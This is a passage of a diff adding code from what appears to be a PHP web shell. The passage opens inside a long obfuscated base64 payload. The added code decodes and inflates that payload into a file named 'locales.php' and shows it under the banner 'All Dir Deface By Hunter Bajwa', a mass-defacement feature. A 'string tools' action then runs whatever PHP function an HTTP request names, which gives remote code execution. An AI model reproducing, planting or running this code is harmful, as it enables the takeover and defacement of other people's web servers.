EJ0Dse3g+HoRycY49R5ULuHurYhHWL3DJ5psMy4DpZJLYGqnY4cA+C49tf8uAb2eBONpRkaIITsqAIwXSRaOpLRySIZx6hxGh0pbt1DLAzolGEOPsTCeGxYOjZOxKZHLBsvBZMUSycNf2y3DtSEqiN9muDQbJrrg+oEzORHBoRmWi2THFFj+ohp5FCzpgYodamAIj6nGVMaw72G03QaGsiMcp5zYCzuQgSdgfSXwdFxw5Bq1ili2Q/aAsOLu08Xdz86l6PR7fgSzeE8KLI5HLYIGxbQ9F2iKeCPYc0Kq5SkOSOdToc4DaeQ84kQiDLY2N8H4M/YGCuNPVDd+fl8D0i2jlXx+joo1XnsBpTip2T1OmIQ7FNCKKnvQ5btgZsJ7DD5vlPXeJvZfrAshse92lAwYyyKp2y2j7nhK+hpmHFvCz31UfD5kvW13JP8ws8Otrphbf9gI7ipMEl05O44tSxItmYIUskBJ99gDnB0XNTkGsobGiXpSREzi2BcczLl/eiXY6w1xra3wEBkHAY9pxJhSoRDFujYtRma/BdiU4H5ZAf296nMXerrSeVUZQ4bjRVl54Eos/AEVGS2KtzQnhGRfMIWh5ER5k3SxXBWF76oNayWy7TeNvmcLyR6ArQTPOrU2EDl6bwx1pHZIYIvs45z0lJ9WISj9/9wNtOKiu2s3l1WN2OKdR0Gpzzn6JTzYPaU4sp1NbMbCNLhKeiwbYNwTsdMjYoPfR5AZ0IzeP/tGBI1y5VpLPFwnHMYrHK4AAyc+jbbePXUpUVZO6ixoMgVx1r5h9hcCtn551QxlHODsE3Nvk11tvv9e4077EVZFiKmcgw8QBPSWdHkPLQ9ObJQ5ixtaXsELpfH1BRe3qDNm9HMzZ5fg/JCbB2pQXmNNIXJftS69V8w8O/fuL+VYbWNHKU+uuUlxiENok7FH8dM1OlqZus7pD0r3sbH6LzJvKzv9hNRNt24Do7tuJ50q6WGeV54HojU0NTILwQjVVDbGBMjpwzL93fpitCF5KckVQpPZnrJ2QjF9WhaL0hdUi4oSaorxviOtf6mA9iC255TCGdY18WvELUS63zQu7++uBmN7waDkSmFq0Tzyn2zHC/zl25c1L0T+j2oTTDGglCx1aQpRWFouvbROoX2No8quplK/2Deawyi6VhsXW/W8vJfh2s7UcrM1y17Xyrvcm3y7btWuio6h1D3mTnISavSN+Tn25eURxotaqeYK1FBqLVI/b5qkbRAhkCRkg3vLwWWat/1WvV+xCYZRLue8HfQNq8MEi1haOcJz9w8K6ljb4qTc1HTn5NrTiXGryoLXnXFzdeQRrtNLs6tffYe/wdjFJ3QoIGN6G8sXM8UW0Ry0g2C14tYVDL2fdi4/1beLett8k1Li1Jcu31pcZs6s8UkZoVCdYgv9KmxVSTdrsIXnVvEBUuVgFLERIxW31VfD8q3C/OyUfyv7P8A";
+    $writing = @fopen("locales.php", "w");
+    @fwrite($writing, htmlspecialchars_decode(gzinflate(base64_decode($dirdeface))));
+    @fclose($writing);
+    ?>
+    <center>
+    <h1>All Dir Deface By Hunter Bajwa</h1>
+    <br><br>
+    <iframe src="locales.php" height="700" width="100%"></iframe>
+    </center>
+    <br><br>
+    <?php
+    printFooter();
+}
+ 
+ 
+ 
+ 
+function actionStringTools() {
+    if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
+    if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
+    if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= dechex(ord($p[$i]));return strtoupper($r);}}
+    if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
+   
+    if(isset($_POST['ajax'])) {
+        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
+        ob_start();
+        if(function_exists($_POST['p1']))
+            echo $_POST['p1']($_POST['p2']);
+        $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
+        echo strlen($temp), "\n", $temp;
+        exit;
+    }
+    printHeader();
+    echo '<h1>String conversions</h1><div class=content>';
+    $stringTools = array(
+        'Base64 encode' => 'base64_encode',
+        'Base64 decode' => 'base64_decode',
+        'Url encode' => 'urlencode',
+        'Url decode' => 'urldecode',
+        'Full urlencode' => 'full_urlencode',
+        'md5 hash' => 'md5',
+        'sha1 hash' => 'sha1',
+        'crypt' => 'crypt',
+        'CRC32' => 'crc32',
+        'ASCII to HEX' => 'ascii2hex',
+        'HEX to ASCII' => 'hex2ascii',
+        'HEX to DEC' => 'hexdec',
+        'HEX to BIN' => 'hex2bin',
+        'DEC to HEX' => 'dechex',
+        'DEC to BIN' => 'decbin',
+        'BIN to HEX' => 'bin2hex',
+        'BIN to DEC' => 'bindec',        
+        'String to lower case' => 'strtolower',
+        'String to upper case' => 'strtoupper',
+        'Htmlspecialchars' => 'htmlspecialchars',
+        'String length' => 'strlen',
+    );
+    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
+        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+    echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
+    foreach($stringTools as $k => $v)
+        echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
+        echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".htmlspecialchars(@$_POST['p2'])."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
+   
